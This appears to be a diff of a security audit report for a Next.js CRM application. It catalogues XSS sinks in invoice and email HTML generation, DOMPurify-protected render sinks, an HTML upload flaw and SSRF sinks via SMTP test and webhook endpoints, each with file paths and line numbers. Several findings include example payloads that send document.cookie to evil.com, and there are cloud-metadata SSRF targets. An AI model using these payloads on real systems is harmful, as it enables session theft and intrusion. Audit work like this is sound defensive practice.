-- `Dockerfile` — Production Next.js image (multi-stage, non-root user)
-- `services/compute/Dockerfile` — Compute service image (--reload mode)
-- `.github/workflows/ci.yml` — CI pipeline (lint, build)
-- `.github/workflows/deploy.yml` — CD pipeline (SSH deploy, no approval gates)
+- `Dockerfile` — Application container build
+- `docker-compose.yml` — Multi-service orchestration
+- `scripts/deploy.sh` — Production deployment script (credentials, server IP, Nginx config)
+- `scripts/create-admin.ts` — Admin account creation (default credentials)
+- `scripts/import-v1.ts` — V1 data import
+- `services/compute/main.py` — FastAPI compute sidecar (no auth)
+- `services/compute/Dockerfile` — Compute service container
 
-### XSS-Relevant Frontend Components
-- `src/components/email-template-form.tsx` — innerHTML (lines 81, 90, 338), dangerouslySetInnerHTML (line 392)
-- `src/app/(dashboard)/knowledge-base/[id]/page.tsx` — dangerouslySetInnerHTML (line 139)
-- `src/app/portal/knowledge-base/page.tsx` — dangerouslySetInnerHTML (line 81, public access)
-- `src/app/(dashboard)/email-log/page.tsx` — dangerouslySetInnerHTML (line 246)
-- `src/components/profitability/ai-observations.tsx` — dangerouslySetInnerHTML with custom markdown parser (line 162)
-- `src/lib/invoice-html.ts` — HTML template strings with unescaped interpolation (lines 148-242, 274-322)
+### Frontend Components with Security Relevance
+- `src/components/email-template-form.tsx` — Email template editor (`innerHTML` sink)
+- `src/app/(dashboard)/email-log/page.tsx` — Email log display (`dangerouslySetInnerHTML` with DOMPurify)
+- `src/app/portal/knowledge-base/page.tsx` — Portal KB (`dangerouslySetInnerHTML` with DOMPurify)
+- `src/app/(dashboard)/knowledge-base/[id]/page.tsx` — KB article display
+- `src/components/profitability/ai-observations.tsx` — AI observations display
 
-### Journey & Automation Engine
-- `src/lib/journey-engine.ts` — Automated email/SMS/Telegram/WhatsApp sending
+### External Service Integration
+- `src/lib/whatsapp.ts` — WhatsApp Cloud API integration
+- `src/lib/webhooks.ts` — Outbound webhook dispatch (`isPrivateUrl()` check, DNS rebinding bypass risk)
+- `src/lib/compute.ts` — Compute sidecar client
+- `src/lib/journey-engine.ts` — Journey automation engine (HTML injection in emails)
 
 ---
 
 ## 9. XSS Sinks and Render Contexts
 
-### Critical XSS Sinks (Network-Accessible)
+### Server-Side HTML Injection (Template Literals — No Sanitization)
 
-**All sinks below are on pages served by the Next.js application to authenticated users or public visitors. Sanitization status and input source documented for each.**
+These are the most critical XSS findings. All involve user-controlled data interpolated directly into HTML strings served as email bodies, invoice documents, or completion acts. **Zero HTML escaping is applied.**
 
-#### 9.1 Portal Knowledge Base — CRITICAL (Public Access, Stored XSS)
-- **File:** `src/app/portal/knowledge-base/page.tsx`, **Line 81**
-- **Sink:** `dangerouslySetInnerHTML={{ __html: selectedArticle.content }}`
-- **Render Context:** HTML Body Context
-- **Input Source:** `article.content` from database, created by CRM users via KB editor
-- **Sanitization:** NONE — raw HTML from database rendered directly
-- **Attack Scenario:** CRM user with KB write access injects `<img src=x onerror=alert(document.cookie)>` into article content → all portal visitors execute the XSS payload
-- **Network Surface:** YES — portal pages are public-facing
+#### Sink 1: `generateInvoiceHtml()` — Invoice HTML Generation
+**File:** `src/lib/invoice-html.ts`, lines 148–242
+**Render Context:** HTML Body — full HTML document served as `text/html` at `/api/v1/invoices/[id]/pdf` and sent as email attachment
+**Sanitization:** None
 
-#### 9.2 Dashboard Knowledge Base — HIGH
-- **File:** `src/app/(dashboard)/knowledge-base/[id]/page.tsx`, **Line 139**
-- **Sink:** `dangerouslySetInnerHTML={{ __html: article.content }}`
-- **Render Context:** HTML Body Context
-- **Input Source:** `article.content` from database
-- **Sanitization:** NONE
-- **Network Surface:** YES — authenticated dashboard page
+User-controlled fields injected raw into HTML template literals:
+- Line 153: `${invoice.invoiceNumber}` — invoice number
+- Lines 199: `${item.name}`, `${item.description}` — invoice line item names/descriptions
+- Lines 220-225: `${bankName}`, `${bankVoen}`, `${bankCode}`, `${bankSwift}`, `${bankCorrAccount}`, `${bankAccount}` — bank details from org settings
+- Line 231: `${companyStampUrl}` — injected into `<img src="...">` attribute (URL injection)
+- Lines 233-234: `${signerName}`, `${signerTitle}` — from org settings
+- Lines 241-242: `${terms}`, `${footerNote}` — invoice fields
 
-#### 9.3 Email Template Editor — HIGH (Multiple Sinks)
-- **File:** `src/components/email-template-form.tsx`
-  - **Line 81:** `editorRef.current.innerHTML = form.htmlBody || ""` — Direct `innerHTML` assignment
-  - **Line 90:** `editorRef.current.innerHTML = form.htmlBody || ""` — Re-initialization
-  - **Line 338:** `current.innerHTML = html` — HTML source toggle
-  - **Line 392:** `dangerouslySetInnerHTML={{ __html: form.htmlBody... }}` — Preview tab
-- **Render Context:** HTML Body Context
-- **Input Source:** User-authored email template HTML body
-- **Sanitization:** PARTIAL — template variable replacement (`{{var}}` → demo spans), but original HTML not sanitized
-- **Network Surface:** YES — authenticated dashboard component
+**Attack vector:** Any CRM user who can create invoice items sets `item.description` to `</td></tr></tbody></table><script>document.location="https://evil.com?c="+document.cookie</script>`. The generated HTML executes the script when opened in a browser.
 
-#### 9.4 Email Log Viewer — HIGH
-- **File:** `src/app/(dashboard)/email-log/page.tsx`, **Line 246**
-- **Sink:** `dangerouslySetInnerHTML={{ __html: log.body }}`
-- **Render Context:** HTML Body Context
-- **Input Source:** `emailLog.body` from database — full email HTML including user-authored content and template-rendered data
-- **Sanitization:** NONE
-- **Network Surface:** YES — authenticated dashboard page
+#### Sink 2: `getEmailTemplate()` — Custom Message in Invoice Email
+**File:** `src/lib/invoice-html.ts`, line 308
+**Render Context:** HTML Body (email)
+**Sanitization:** None
+```
+${customMessage ? `<p ...>${customMessage}</p>` : ''}
+```
+**Input path:** `POST /api/v1/invoices/[id]/send` → `body.message` → `customMessage`. Validated only as `z.string().optional()`.
 
-#### 9.5 AI Observations — HIGH (Custom Markdown Parser Injection)
-- **File:** `src/components/profitability/ai-observations.tsx`, **Line 162**
-- **Sink:** `dangerouslySetInnerHTML={{ __html: markdownToHtml(result.analysis) }}`
-- **Render Context:** HTML Body Context
-- **Input Source:** Claude AI API response text processed by custom `markdownToHtml()` function
-- **Sanitization:** INSUFFICIENT — Custom markdown parser (lines 22-56) uses string interpolation without HTML escaping:
-  - Line 32: `html += '<h4 ...>${trimmed.slice(4)}</h4>'` — No escaping
-  - Line 38: `html += '<li ...>${trimmed.slice(2)}</li>'` — No escaping
-  - Line 44: `html += '<p ...>${trimmed}</p>'` — No escaping
-  - Line 51: `html.replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")` — Capture group `$1` injected into HTML
-- **Attack Scenario:** If AI response contains HTML entities (possible via prompt injection), they execute in the browser
-- **Network Surface:** YES — authenticated dashboard component
+#### Sink 3: Inbox Send — Message Body in Email HTML
+**File:** `src/app/api/v1/inbox/route.ts`, line 320
+**Render Context:** HTML Body (email), also stored in `EmailLog.body` and re-displayed in email-log page
+**Sanitization:** None (only `\n`→`<br>` replacement)
+```typescript
+html: `<div ...>${msgBody.replace(/\n/g, "<br>")}</div>`
+```
+**Input path:** `POST /api/v1/inbox` → `body.body` → `msgBody`. Validated only as `z.string().min(1)`.
 
-#### 9.6 Invoice HTML Generation — HIGH (Server-Side HTML Injection → Email)
-- **File:** `src/lib/invoice-html.ts`
-  - **Line 148:** `${companyName}` — No escaping in HTML template
-  - **Line 149:** `${companyVoen}`, `${companyAddress}` — No escaping
-  - **Line 176-180:** `${clientCo?.name}`, `${clientCo?.email}`, `${clientCo?.phone}` — No escaping
-  - **Line 199:** `${item.name}${item.description ? '<br><span...>${item.description}</span>' : ''}` — **CRITICAL:** `item.description` directly in HTML `<span>`
-  - **Line 233-234:** `${signerName}`, `${signerTitle}` — No escaping
-  - **Line 241-242:** `${terms}`, `${footerNote}` — No escaping
-  - **Line 303:** `<h1 ...>${orgName}</h1>` — No escaping in email template
-  - **Line 308:** `<p ...>${customMessage}</p>` — **CRITICAL:** User-authored custom message directly in HTML email
-- **Render Context:** HTML Body Context (email body and document generation)
-- **Input Source:** Company names, invoice item descriptions, custom messages — all user-controlled database fields
-- **Sanitization:** NONE for any interpolated value
-- **Network Surface:** YES — generated via `/api/v1/invoices/[id]/act` and `/api/v1/invoices/[id]/send`
+#### Sink 4: Offer Send — Message and Notes in Email HTML
+**File:** `src/app/api/v1/offers/[id]/send/route.ts`, lines 49 and 71
+**Render Context:** HTML Body (email)
+**Sanitization:** None
+```typescript
+<p>${parsed.data.message.replace(/\n/g, "<br>")}</p>     // line 49
+${offer.notes ? `<p ...>Notes: ${offer.notes}</p>` : ""}  // line 71
+```
 
-#### 9.7 Invoice Act Document — HIGH (URL Attribute Injection)
-- **File:** `src/app/api/v1/invoices/[id]/act/route.ts`
-  - **Line 120-121:** `<img src="${companyLogoUrl}" alt="${companyName}" ...>` — Logo URL directly in `src` attribute
-  - **Line 129:** `<td>${item.name}...${item.description}</td>` — Item data directly in HTML
-- **Render Context:** HTML Attribute Context (src), HTML Body Context
-- **Input Source:** `companyLogoUrl` from org settings, `item.name`/`item.description` from invoice items
-- **Sanitization:** NONE — `companyLogoUrl` could be `javascript:alert(1)` or contain encoded XSS payloads
-- **Network Surface:** YES — accessible via authenticated API endpoint
+#### Sink 5: Journey Engine — Step Body in Automation Email
+**File:** `src/lib/journey-engine.ts`, line 134
+**Render Context:** HTML Body (automated email)
+**Sanitization:** None (only `\n`→`<br>` replacement)
+```typescript
+html: `<div ...>${body.replace(/\n/g, "<br>")}</div>`
+```
+**Input path:** Journey step `config.body` field stored in DB by CRM users.
 
-#### 9.8 ICS Calendar Injection — MEDIUM
-- **File:** `src/app/api/v1/calendar/feed/[token]/route.ts`
-  - **Lines 53, 59, 61:** `SUMMARY:${icsEscape(summary)}`, `DESCRIPTION:${icsEscape(task.description)}`
-- **Render Context:** ICS/vCalendar format
-- **Input Source:** `task.title`, `task.description` from database
-- **Sanitization:** PARTIAL — `icsEscape()` (lines 4-6) escapes `\`, `;`, `,`, `\n` but **does NOT escape colons (`:`)** which can break ICS property parsing
-- **Network Surface:** YES — public endpoint at `/api/v1/calendar/feed/[token]`
+#### Sink 6: Plan Requests — Contact Info in Admin Notification Email
+**File:** `src/app/api/v1/plan-requests/route.ts`, lines 57-60
+**Render Context:** HTML Body (email to admin)
+**Sanitization:** None
+```typescript
+<td>${parsed.data.contactName}</td>
+<td>${parsed.data.contactPhone}</td>
+<td>${parsed.data.message}</td>
+```
 
-#### 9.9 Email Template Rendering — HIGH (Server-Side)
-- **File:** `src/lib/email.ts`, **Lines 173-179**
-- **Sink:** `renderTemplate()` — string replace `{{key}}` → value in HTML body
-- **Render Context:** HTML Body Context (email)
-- **Input Source:** Template variables including `contact.fullName`, other user-controlled fields
-- **Sanitization:** NONE — values directly interpolated into HTML template
-- **Usage:** Campaign emails (`campaigns/[id]/send/route.ts`, line 109-112), offer emails, invoice emails
+#### Sink 7: Completion Act — Item Names/Logo URL in HTML
+**File:** `src/app/api/v1/invoices/[id]/act/route.ts`, lines 120-121, 129
+**Render Context:** HTML Body (served as `text/html`)
+**Sanitization:** None
+```typescript
+<img src="${companyLogoUrl}" alt="${companyName}" ...>  // URL injection
+<td>${item.name}${item.description ? ...}</td>          // HTML body injection
+```
 
-### Sanitization Gap Analysis
+### Client-Side `innerHTML` Sinks (No Sanitization)
 
-The application has `src/lib/sanitize.ts` with two functions:
-- `sanitizeHtml(input)` — DOMPurify with `ALLOWED_TAGS: ["b", "i", "em", "strong"]` (very restrictive)
-- `sanitizeText(input)` — Only strips `<>` characters (insufficient for attribute/JS context XSS)
+#### Sink 8: Email Template Editor — `innerHTML` Direct Write
+**File:** `src/components/email-template-form.tsx`, lines 82, 91, 339
+**Render Context:** HTML Body (dashboard admin UI)
+**Sanitization:** None on editor `div`; only the preview tab (line 393) uses `sanitizeRichHtml()`
+```typescript
+editorRef.current.innerHTML = form.htmlBody || ""  // lines 82, 91
+current.innerHTML = html                            // line 339
+```
+**Attack scenario:** A user stores `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` in a template. When any admin opens the template editor, the script executes.
 
-**Applied to:** Contact notes, deal descriptions (via Zod schema validation)
-**NOT applied to:** KB article content, email template bodies, invoice item descriptions, AI outputs, email log bodies, custom messages, company names in templates
+### Client-Side `dangerouslySetInnerHTML` (DOMPurify Applied — Mitigated)
+
+These sinks exist but are protected by `sanitizeRichHtml()` (DOMPurify):
+
+| File | Line | Component | Sanitizer |
+|------|------|-----------|-----------|
+| `src/components/email-template-form.tsx` | 393 | Template preview | `sanitizeRichHtml()` ✓ |
+| `src/app/(dashboard)/email-log/page.tsx` | 247 | Email log display | `sanitizeRichHtml()` ✓ |
+| `src/app/portal/knowledge-base/page.tsx` | 82 | Portal KB | `sanitizeRichHtml()` ✓ |
+| `src/app/(dashboard)/knowledge-base/[id]/page.tsx` | 140 | KB article display | `sanitizeRichHtml()` ✓ |
+| `src/components/profitability/ai-observations.tsx` | 163 | AI observations | `sanitizeRichHtml()` ✓ |
+
+**DOMPurify configuration residual risk** (`src/lib/sanitize.ts` lines 9-27): The config allows `style` attribute on all whitelisted tags. Depending on the DOMPurify version, CSS-based attacks (e.g., `style="background-image:url('javascript:...')"`) may bypass sanitization in older browsers. The `href` attribute is also allowed, potentially permitting `javascript:` URIs depending on DOMPurify version.
+
+### File Upload → Stored XSS via `.html` Extension
+
+#### Sink 9: Contract File Upload — HTML Files Served from Public Directory
+**File:** `src/app/api/v1/contracts/[id]/files/route.ts`, lines 68-69
+**Render Context:** Static file served by Next.js from `public/uploads/contracts/`
+```typescript
+const ext = path.extname(file.name) || ""
+const uniqueName = `${crypto.randomBytes(16).toString("hex")}${ext}`
+```
+The extension comes from the user-supplied `file.name`. While MIME type is checked against an allowlist, the extension is not validated against the MIME type. An attacker can upload a file with `Content-Type: text/plain` (allowed) and `file.name: "payload.html"` — the resulting `.html` file is served directly by the static file server, enabling stored XSS.
+
+### SQL Injection
+
+**No SQL injection sinks found.** All database queries use Prisma's parameterized query builder. The single `$queryRaw` usage (`src/app/api/budgeting/snapshot/route.ts` line 24) uses tagged template literals (safe). No `$queryRawUnsafe` or `$executeRawUnsafe` calls exist.
+
+### Command Injection
+
+**No command injection sinks found** in the network-accessible Next.js application. The `telegram-bridge/bot.js` uses `child_process.exec()` to run Claude CLI commands, but this is a local-only long-polling bot (out-of-scope for network attack surface).
 
 ---
 
 ## 10. SSRF Sinks
 
-### Critical SSRF Sinks (Network-Accessible)
+### CRITICAL: SMTP Test Endpoint — No SSRF Protection
 
-#### 10.1 Webhook URL Dispatch — CRITICAL (Fully User-Controlled URL)
-- **File:** `src/lib/webhooks.ts`, **Line 52**
-- **Sink:** `await fetch(webhook.url, { method: "POST", ... })`
-- **HTTP Client:** Native `fetch()`
-- **User Input:** `webhook.url` — fully admin-controllable arbitrary URL stored in database
-- **URL Control:** FULL — admin users register webhook URLs via `/api/v1/webhooks` settings
-- **Validation:** NONE — no URL validation, no private IP blacklist, no protocol restriction
-- **Impact:** CRITICAL — attacker with admin access can:
-  - Access cloud metadata (`http://169.254.169.254/latest/meta-data/iam/security-credentials/`)
-  - Scan internal network (`http://192.168.x.x:port/`)
-  - Access internal services (`http://localhost:8000/`, `http://db:5432/`)
-  - Exfiltrate data via POST body containing CRM event payloads
-- **Trigger:** Any CRM event that dispatches webhooks (deals, contacts, leads updated)
-- **Authentication Required:** Admin role
+**File:** `src/app/api/v1/settings/smtp/test/route.ts`, lines 33-45
+**HTTP Client:** `nodemailer.createTransport({ host: smtp.smtpHost, port: smtp.smtpPort })`
+**User Input Reaches Host:** YES — `smtp.smtpHost` and `smtp.smtpPort` are user-configured values stored in `organization.settings.smtp`
 
-#### 10.2 SMTP Configuration — CRITICAL (Admin-Controlled Host/Port)
-- **File:** `src/lib/email.ts`, **Lines 14-34, 54-55, 61**
-- **Sink:** `nodemailer.createTransport({ host: config.smtpHost, port: config.smtpPort, ... })`
-- **HTTP Client:** `nodemailer` SMTP library
-- **User Input:** `smtpHost` and `smtpPort` — fully admin-controllable via `/api/v1/settings/smtp` PUT
-- **URL Control:** FULL — admin sets arbitrary SMTP server host and port
-- **Validation:** NONE — no host whitelist, no private IP blacklist
-- **Additional Risk:** `rejectUnauthorized: false` (line 61) disables TLS certificate verification — enables MitM
-- **Impact:** CRITICAL — attacker with admin access can:
-  - Redirect all email traffic to attacker-controlled SMTP server (credential harvesting)
-  - Target internal SMTP servers for reconnaissance
-  - Connect to any TCP port on any host as an SMTP client
-- **Trigger:** Any email sending: campaigns, invoices, offers, portal notifications, event confirmations
-- **Authentication Required:** Admin role
-- **Usage locations:**
-  - `src/app/api/v1/campaigns/[id]/send/route.ts` (line 113)
-  - `src/app/api/v1/offers/[id]/send/route.ts` (line 75)
-  - `src/app/api/v1/inbox/route.ts` (lines 317-325)
-  - `src/lib/journey-engine.ts` (lines 131-138)
+**Description:** The SMTP test endpoint creates a nodemailer transport directly from user-supplied host and port values **without calling `isPrivateHost()`**. The main email sending function in `src/lib/email.ts` (line 55) does check `isPrivateHost()` before creating the transporter, but the test endpoint bypasses `email.ts` entirely and duplicates the transport setup inline.
 
-#### 10.3 Compute Service Path Concatenation — HIGH
-- **File:** `src/lib/compute.ts`, **Line 7**
-- **Sink:** `await fetch(\`${COMPUTE_URL}${path}\`, { method: "POST", ... })`
-- **HTTP Client:** Native `fetch()`
-- **User Input:** `path` parameter — constructed from API route parameters
-- **URL Control:** PARTIAL — path is concatenated to base URL without validation
-- **Validation:** NONE — no path whitelist, no traversal prevention
-- **Impact:** HIGH — authenticated attacker could potentially construct paths targeting unintended compute service endpoints
-- **Base URL:** `process.env.COMPUTE_SERVICE_URL || "http://localhost:8000"` (line 1)
-- **Authentication Required:** Yes (standard auth)
+**Impact:**
+- Any authenticated org admin can set `smtpHost` to `169.254.169.254` (cloud metadata), `10.x.x.x`, `192.168.x.x`, `127.0.0.1`, or any internal service
+- The nodemailer TCP connection probes the target on the configured port, enabling **internal port scanning**
+- Error messages (`ECONNREFUSED`, `ETIMEDOUT`, `EAUTH`) are reflected verbatim in the response (lines 85-88), enabling **banner-grabbing inference**
+- 10-15 second timeout provides meaningful connection probing window
 
-#### 10.4 Twilio SMS API — MEDIUM (Partial URL Control)
-- **File:** `src/app/api/v1/inbox/route.ts`, **Lines 371-377**
-- **File:** `src/lib/journey-engine.ts`, **Lines 155-169**
-- **Sink:** `fetch(\`https://api.twilio.com/2010-04-01/Accounts/${accountSid}/Messages.json\`, ...)`
-- **HTTP Client:** Native `fetch()` with HTTP Basic Auth
-- **User Input:** `accountSid` from channel settings — admin-controllable
-- **URL Control:** PARTIAL — accountSid interpolated into fixed Twilio URL
-- **Validation:** NONE on accountSid format
-- **Impact:** MEDIUM — limited SSRF since base domain is fixed to `api.twilio.com`
-- **Authentication Required:** Admin role (channel config)
+**Contrast:** `src/lib/email.ts` line 3 imports `isPrivateHost` from `src/lib/url-validation.ts` and line 55 blocks private hosts. The test route has no such guard.
 
-#### 10.5 Facebook API Token in Query String — MEDIUM (Token Exposure)
-- **File:** `src/lib/facebook.ts`, **Lines 10, 33**
-- **Sink:** `fetch(\`https://graph.facebook.com/v20.0/me/messages?access_token=${pageAccessToken}\`, ...)`
-- **HTTP Client:** Native `fetch()`
-- **User Input:** `pageAccessToken` from channel config database
-- **URL Control:** NONE — fixed Meta API domain
-- **Security Issue:** Access token in URL query string — will appear in:
-  - Server access logs
-  - Proxy logs
-  - CDN logs
-  - Network monitoring tools
-- **Impact:** MEDIUM — token leakage via logs rather than SSRF
-- **Authentication Required:** Admin role (channel config)
+### LOW: Outbound Webhook Dispatch — DNS Rebinding Bypass Risk
 
-#### 10.6 Telegram Bot API — LOW (Token in URL Path)
-- **Files:**
-  - `src/app/api/v1/inbox/route.ts`, **Line 343**
-  - `src/app/api/v1/inbox/conversations/[id]/messages/route.ts`, **Line 31**
-  - `src/lib/journey-engine.ts`, **Line 219**
-- **Sink:** `fetch(\`https://api.telegram.org/bot${tgChannel.botToken}/sendMessage\`, ...)`
-- **HTTP Client:** Native `fetch()`
-- **User Input:** `botToken` from channel config database
-- **URL Control:** NONE — fixed Telegram API domain
-- **Impact:** LOW — bot token in URL could leak via logs; no direct SSRF
-- **Authentication Required:** Admin role (channel config)
+**File:** `src/lib/webhooks.ts`, lines 50-67
+**HTTP Client:** `fetch(webhook.url, ...)`
+**User Input Reaches Host:** YES — `webhook.url` is configured by org admins
 
-#### 10.7 WhatsApp Cloud API — LOW
-- **File:** `src/lib/whatsapp.ts`, **Lines 80, 204**
-- **Sink:** `fetch(\`https://graph.facebook.com/v21.0/${config.phoneNumberId}/messages\`, ...)`
-- **HTTP Client:** Native `fetch()` with Bearer token in Authorization header (correct pattern)
-- **User Input:** `phoneNumberId` from channel config
-- **URL Control:** NONE — fixed Meta API domain
-- **Impact:** LOW — properly uses Authorization header, not query string
-- **Authentication Required:** Admin role (channel config)
+**SSRF Protections Applied:** `isPrivateUrl()` is called at line 50 before the fetch. The blocklist in `src/lib/url-validation.ts` (lines 18-23) blocks:
+- Known private IP ranges (127.x, 10.x, 172.16-31.x, 192.168.x, 169.254.x)
+- IPv6 loopback/ULA/link-local
+- Hardcoded dangerous hostnames: `localhost`, `metadata.google.internal`, `169.254.169.254`, `metadata.internal`
 
-#### 10.8 Anthropic AI API — LOW
-- **Files:**
-  - `src/app/api/v1/ai/chat/route.ts` (line 8)
-  - `src/app/api/v1/ai/route.ts` (line 11)
-  - `src/app/api/v1/public/portal-chat/route.ts` (line 365)
-  - `src/app/api/budgeting/ai-narrative/route.ts` (line 96)
-  - `src/lib/cost-model/ai-analysis.ts` (line 138)
-- **Sink:** `new Anthropic({ apiKey: process.env.ANTHROPIC_API_KEY })`
-- **HTTP Client:** Anthropic SDK (internally uses fetch to api.anthropic.com)
-- **User Input:** NONE on endpoint — API key from environment variable
-- **URL Control:** NONE — fixed Anthropic API endpoint
-- **Impact:** LOW for SSRF; MEDIUM for prompt injection leading to data exfiltration or API cost abuse
-- **Authentication Required:** Varies (portal-chat is public; others require auth)
+**Residual Bypass Risks:**
+- The blocklist is **hostname-string-only** — it does not perform DNS resolution. A DNS rebinding attack (attacker domain initially resolves to a public IP passing the check, then rebinds to 192.168.x.x before the actual `fetch`) would bypass it
+- Azure IMDS endpoint `169.254.169.254` is blocked, but `metadata.azure.com` variant is not explicitly blocked
+- Non-standard cloud provider link-local ranges (e.g., `100.100.100.200` for Alibaba Cloud) are not blocked
 
-### SSRF Summary Matrix
+### INFORMATIONAL: Fixed-Host External API Calls (Not Exploitable)
 
-| # | Sink | File:Line | Client | URL Control | Severity |
-|---|------|-----------|--------|-------------|----------|
-| 1 | Webhook dispatch | `src/lib/webhooks.ts:52` | fetch() | FULL | **CRITICAL** |
-| 2 | SMTP config | `src/lib/email.ts:54-55` | nodemailer | FULL (host:port) | **CRITICAL** |
-| 3 | Compute service | `src/lib/compute.ts:7` | fetch() | PARTIAL (path) | HIGH |
-| 4 | Twilio SMS | `src/app/api/v1/inbox/route.ts:371` | fetch() | PARTIAL (accountSid) | MEDIUM |
-| 5 | Facebook API | `src/lib/facebook.ts:10,33` | fetch() | NONE (token leak) | MEDIUM |
-| 6 | Telegram API | `src/app/api/v1/inbox/route.ts:343` | fetch() | NONE (token leak) | LOW |
-| 7 | WhatsApp API | `src/lib/whatsapp.ts:80,204` | fetch() | NONE | LOW |
-| 8 | Anthropic AI | Multiple files | SDK | NONE | LOW |
+The following outbound requests use fixed, hardcoded hosts and are not SSRF-exploitable:
+
+| Sink | File | Host | User Input |
+|------|------|------|------------|
+| Telegram sendMessage | `src/app/api/v1/inbox/conversations/[id]/messages/route.ts` line 31 | `api.telegram.org` (hardcoded) | `botToken` in URL path only |
+| WhatsApp Cloud API | `src/lib/whatsapp.ts` lines 79-95 | `graph.facebook.com` (hardcoded) | `phoneNumberId` in URL path only |
+| Compute sidecar | `src/lib/compute.ts` line 7 | `COMPUTE_SERVICE_URL` env (default `localhost:8000`) | No user input |
+| Journey cron self-call | `src/instrumentation.ts` lines 19-21 | `NEXTAUTH_URL` env (default `localhost:3000`) | No user input |
+| Anthropic SDK | Multiple AI routes | `api.anthropic.com` (SDK-hardcoded) | User input in request body only, not URL |
+
+### NOT FOUND: Other SSRF Sink Categories
+
+The following SSRF sink categories were searched for but **not found** in the network-accessible codebase:
+- **Headless browsers / Render engines:** No Puppeteer, Playwright, Selenium, wkhtmltopdf, or html-to-pdf library used in the application
+- **Media processors:** No ImageMagick, FFmpeg, GraphicsMagick, or Ghostscript integration
+- **Link preview / Unfurlers:** No URL metadata extraction or oEmbed fetching
+- **Package/Plugin installers:** No "install from URL" functionality
+- **SSO/OIDC Discovery / JWKS fetchers:** No OpenID Connect or SAML metadata fetching (no external IdP configured)
+- **Import from URL:** No remote URL import functionality (imports are file-based only: CSV, Excel)
+- **Raw sockets / Connect APIs:** No direct socket operations in network-accessible code
+- **Monitoring / Health check frameworks:** The `/api/health` endpoint is internal only; no URL pinger or uptime checker
+- **Cloud metadata helpers:** No explicit AWS/GCP/Azure metadata API calls (the risk is via SSRF through SMTP test endpoint reaching `169.254.169.254`)
+
+---
+
+*End of Code Analysis Deliverable*
